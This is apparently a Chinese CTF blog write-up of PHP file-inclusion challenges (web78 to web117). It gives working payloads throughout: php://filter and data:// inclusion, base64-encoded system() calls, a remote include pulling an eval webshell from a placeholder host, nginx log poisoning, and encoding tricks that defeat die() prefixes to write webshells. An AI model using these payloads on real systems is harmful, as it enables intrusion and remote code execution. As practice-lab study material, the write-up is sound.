---
title: Web入门_文件包含
author: Creexile
date: 2024-07-07
lastMod: 2025-08-29
summary: ''
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [RCE, PHP, 文件包含, CTF]
---

# 文件包含

---

## web78

- 描述: 文件包含系列开始

没有过滤, 直接包含似乎不显示, 还是用伪协议吧

```php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    include($file);
```

payload:

```
?file=php://filter/read=convert.base64-encode/resource=flag.php
```

## web79

- 描述: 同上

过滤php, 那就成data

```php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    include($file);
```

记得如果执行命令也要编码, 因为用的`<?php`, payload如下:

```
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOyA/Pg==		# ls
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=		# cat flag.php
```

## web80

- 描述: 同上

两个都没了, 怎么办呢, 可以用远程文件包含和日志文件包含

```php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    include($file);
```

payload1:

```
?file=http://ip:port/cmd.txt
# 文件中是 <?php @eval($_POST[cmd]); ?>, 利用POST执行即可
```

日志包含, 本题Web服务器是Nginx

payload2:

```
# 首先将User-Agent改成一句话木马然后正常访问
# 然后url加上以下字符串然后蚁剑连接
?file=/var/log/nginx/access.log
```

## web81

- 描述: 做完这道题，你就已经经历的九九八十一难，是不是感觉很快？没关系，后面还是九百一十九难，加油吧，少年！

那就不能远程包含了, 那就只能日志包含

```php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    include($file);
```

payload同上一题

## web82-web86

- 描述: 竞争环境需要晚上11点30分至次日7时30分之间做，其他时间不开放竞争条件

```php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    include($file);
```

现在是早上, 遗憾离场

[类似题目](https://blog.csdn.net/qq_46091464/article/details/108021053)和[session.upload_progress详解](https://www.freebuf.com/vuls/202819.html)

## web87

- 描述: 继续秀

过滤了点,可以通过双重url编码绕过, 但是这种类似于死亡die和死亡exit的, 还得是[P神-谈一谈php://filter的妙用](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)以及[file_put_content和死亡·杂糅代码之缘](https://xz.aliyun.com/t/8163)

利用点在`file_put_contents`, 第一个参数支持伪协议

```php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $content = $_POST['content'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    file_put_contents(urldecode($file), "<?php die('大佬别秀了');?>".$content);
```

思路一般是想要将杂糅或者死亡代码分解成php无法识别的代码, 基本上都是利用php伪协议filter, 结合编码或者相应的过滤器进行绕过

**base64编码绕过**

```
GET
?file=%2570%2568%2570%253a%252f%252f%2566%2569%256c%2574%2565%2572%252f%2577%2572%2569%2574%2565%253d%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2564%2565%2563%256f%2564%2565%252f%2572%2565%2573%256f%2575%2572%2563%2565%253d%2561%252e%2570%2568%2570
# file=php://filter/write=convert.base64-decode/resource=a.php
# 或者file=php://filter/convert.base64-decode/resource=a.php

POST
content=aaPD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4=
# content=<?php eval($_POST[cmd]);?>

前面的11是为了填充"<?php die('大佬别秀了');?>"
base64是4位4位解码，其中"<?php die('大佬别秀了');?>"解码的内容只有phpdie，所以需要再填充两位。
```

**rot13编码绕过**

```
GET
?file=%2570%2568%2570%253a%252f%252f%2566%2569%256c%2574%2565%2572%252f%2573%2574%2572%2569%256e%2567%252e%2572%256f%2574%2531%2533%252f%2572%2565%2573%256f%2575%2572%2563%2565%253d%2563%252e%2570%2568%2570
# file=php://filter/string.rot13/resource=c.php

POST
content=<?cuc riny($_CBFG[pzq]);?>
# content=<?php eval($_POST[cmd]);?>
```

然后直接访问生成的php文件即可执行命令

## web88

- 描述: 同上

换成正则了, 没事, 问号没去掉, 我们继续用data

```php
$file = $_GET['file'];
    if(preg_match("/php|\~|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\-|\_|\+|\=|\./i", $file)){
        die("error");
    }
    include($file);
```

至于为什么file还有=不会被过滤, 因为这里的`=`是用来传参的, 不会被划分到变量中; 还有在base64中, 最后的等号是用于占位的, 就算去掉也不会对解码有影响

payload:

```
# ls
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKGxzKTs/Pg
# cat fl0g.php
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTs/Pg
```

## web116

- 描述: misc+lfi

将视频下载下来, 用winhex之类的打开, 翻一翻, 找到了很多类似PNG头的东西, 然后再找找尾巴(END), 注意正确的PNG头是`89 50 4E 47`, END为`49 45 4E 44`

![image-20240707202332622](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240707202332622.png)

> 冷知识, 双击文件尾巴(END)然后再双击PNG头可以立刻选中这一大片区域

另存为PNG, 打开发现是代码片段:

```php
<?php
function filter($x){
	if(preg_match('/http|https|data|input|rot13|base64|string|log|sess/i',$x)){
		die('too young too simple sometimes native!');
	}
}
$file=isset($_GET['file'])?$_GET['file']:"sp2.mp4";
header('Content-Type:video/mp4');
filter($file);
echo file_get_contents($file);
?>
```

所以只需要GET传参 (似乎只能直接包含) 就可以直接包含执行了, 可是他啥也没说啊. 那就试试flag.php, 成了; payload如下

```
?file=flag.php
```

![image-20240707204316890](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240707204316890.png)

## web117

- 无描述

```php
<?php
/*
# -*- coding: utf-8 -*-
# @Author: yu22x
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-01 18:16:59
*/
highlight_file(__FILE__);
error_reporting(0);
function filter($x){
    if(preg_match('/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i',$x)){
        die('too young too simple sometimes naive!');
    }
}
$file=$_GET['file'];
$contents=$_POST['contents'];
filter($file);
file_put_contents($file, "<?php die();?>".$contents);
```

这个也是经典的死亡die了, 但是rot13和base64都给你ban了, 但还有[文件包含之 php://filter的convert.iconv.\* 绕过](https://www.cnblogs.com/konglongwu/p/16880784.html), 以及[php://filter的各种过滤器](https://blog.csdn.net/qq_44657899/article/details/109300335), 百八十种编码方式任君选择

把一句话木马从`UCS-2LE`编码转换为`UCS-2BE`编码, 我试了挺多方法的可是就是输出不了什么, 那我就直接抄了

```php
<?php
	$temp = iconv("UTF-8", "UCS-2LE", '<?php @eval($_POST[1]);?>');
	$result = iconv("UCS-2LE","UCS-2BE", $temp);
	echo "payload:".$result.'<br>';
?>
```

和之前的步骤大同小异, 密码为1执行命令即可

```
GET
?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=b.php

POST
contents=?<hp pvela$(P_SO[T]1;)>?
```

相关文件

- [[../../../ctf/ctf基础/文件包含]]
